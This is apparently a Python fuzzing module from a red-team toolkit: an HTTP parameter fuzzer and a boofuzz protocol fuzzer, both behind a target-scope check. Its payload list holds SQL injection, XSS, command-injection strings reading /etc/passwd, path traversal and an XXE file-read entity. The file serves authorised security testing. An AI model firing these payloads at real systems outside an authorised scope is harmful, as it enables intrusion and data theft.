"""
Fuzzer - Input Fuzzing Wrapper
================================
Wraps boofuzz and generic HTTP fuzzing for discovery.
"""

import logging
import subprocess
import time
from typing import Optional

from core.safety import get_safety_module
from red_team.models import ScanResult

logger = logging.getLogger("red_team.fuzzing")


class Fuzzer:
    """
    Input fuzzer for discovering crashes and unexpected behavior.
    Supports HTTP endpoint fuzzing and protocol fuzzing via boofuzz.
    """

    def __init__(self):
        self.safety = get_safety_module()

    def fuzz_http(
        self,
        target_url: str,
        method: str = "GET",
        parameters: dict = None,
        iterations: int = 100,
        round_id=None,
    ) -> dict:
        """
        Fuzz HTTP endpoints with malformed inputs.

        Args:
            target_url: Target URL to fuzz.
            method: HTTP method (GET, POST, PUT).
            parameters: Base parameters to mutate.
            iterations: Number of fuzz iterations.
            round_id: Simulation round ID.

        Returns:
            Dict with results including any crashes/anomalies found.
        """
        import requests as req
        from urllib.parse import urlparse

        parsed = urlparse(target_url)
        if not self.safety.validate_target(parsed.hostname or ""):
            return {"success": False, "error": "Target not in allowed scope"}

        parameters = parameters or {"input": "test"}
        anomalies = []
        fuzz_payloads = self._generate_payloads()

        for i, payload in enumerate(fuzz_payloads[:iterations]):
            try:
                fuzzed_params = {k: payload for k in parameters}

                if method.upper() == "GET":
                    resp = req.get(target_url, params=fuzzed_params, timeout=10)
                elif method.upper() == "POST":
                    resp = req.post(target_url, data=fuzzed_params, timeout=10)
                else:
                    resp = req.request(method, target_url, data=fuzzed_params, timeout=10)

                # Detect anomalies
                if resp.status_code >= 500:
                    anomalies.append({
                        "iteration": i,
                        "payload": payload[:200],
                        "status_code": resp.status_code,
                        "response_length": len(resp.content),
                        "type": "server_error",
                    })
                elif resp.elapsed.total_seconds() > 5:
                    anomalies.append({
                        "iteration": i,
                        "payload": payload[:200],
                        "response_time": resp.elapsed.total_seconds(),
                        "type": "timeout_anomaly",
                    })

            except req.exceptions.Timeout:
                anomalies.append({"iteration": i, "payload": payload[:200], "type": "timeout"})
            except req.exceptions.ConnectionError:
                anomalies.append({"iteration": i, "payload": payload[:200], "type": "connection_reset"})
            except Exception as e:
                anomalies.append({"iteration": i, "payload": payload[:200], "type": "error", "error": str(e)})

        return {
            "success": True,
            "total_iterations": min(iterations, len(fuzz_payloads)),
            "anomalies_found": len(anomalies),
            "anomalies": anomalies[:50],  # Cap for storage
        }

    def fuzz_protocol(
        self,
        target_ip: str,
        target_port: int,
        protocol: str = "tcp",
        iterations: int = 50,
    ) -> dict:
        """
        Protocol-level fuzzing using boofuzz (if available).
        """
        if not self.safety.validate_target(target_ip):
            return {"success": False, "error": "Target not in allowed scope"}

        try:
            from boofuzz import Session, Target, s_initialize, s_string, s_static
            from boofuzz.connections import TCPSocketConnection

            session = Session(
                target=Target(connection=TCPSocketConnection(target_ip, target_port)),
                sleep_time=0.1,
            )

            s_initialize("fuzz_request")
            s_string("FUZZ", fuzzable=True)
            s_static("\r\n")

            session.connect(s_initialize)
            session.fuzz(max_depth=iterations)

            return {
                "success": True,
                "total_iterations": iterations,
                "crashes_detected": session.num_cases_actually_fuzzed,
            }

        except ImportError:
            logger.warning("boofuzz not installed, skipping protocol fuzzing")
            return {"success": False, "error": "boofuzz not installed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _generate_payloads(self) -> list:
        """Generate common fuzz payloads."""
        return [
            # Buffer overflow attempts
            "A" * 256, "A" * 1024, "A" * 4096, "A" * 65536,
            # Format string
            "%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n",
            # SQL injection
            "' OR '1'='1", "'; DROP TABLE users;--", "\" OR \"\"=\"",
            "1 UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=1--", "admin'--",
            # XSS
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            # Command injection
            "; ls -la", "| cat /etc/passwd", "$(whoami)",
            "`id`", "&& dir", "| type C:\\Windows\\win.ini",
            # Path traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            # XML injection
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            # LDAP injection
            "*)(uid=*))(|(uid=*",
            # Null bytes
            "\x00", "test\x00admin",
            # Unicode edge cases
            "\uffff", "\ud800", "🔥" * 100,
            # Integer overflow
            "99999999999999999",
            "-1", "0", "2147483647", "-2147483648",
            # Special characters
            "{{7*7}}", "${7*7}", "#{7*7}",
        ]
